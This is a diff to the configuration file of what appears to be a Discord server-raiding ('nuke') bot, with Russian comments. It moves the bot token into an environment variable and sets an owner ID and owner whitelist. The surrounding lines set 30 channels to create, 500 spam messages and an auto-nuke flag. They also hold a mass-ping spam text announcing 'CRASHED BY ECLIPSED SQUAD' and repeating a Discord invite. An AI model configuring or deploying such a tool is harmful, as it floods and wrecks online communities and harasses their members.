@@ -1,4 +1,6 @@
-TOKEN = ""  # Токен бота (не хранится в репозитории)
+import os
+
+TOKEN = os.environ.get("TOKEN", "")  # Задай переменную окружения TOKEN на хостинге
 CHANNELS_COUNT = 30
 SPAM_COUNT = 500
 SPAM_TEXT = "|| @everyone  @here ||\n# CRASHED BY ECLIPSED SQUAD\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9"
@@ -10,7 +12,7 @@ AUTO_NUKE = False
 
 # Whitelist — сюда добавляй Discord ID пользователей
 WHITELIST = []
-OWNER_ID = 0
+OWNER_ID = 1421778029310509056
 
 # Owner whitelist — управляется только овнером через ЛС
-OWNER_WHITELIST = []
+OWNER_WHITELIST = [1421778029310509056]
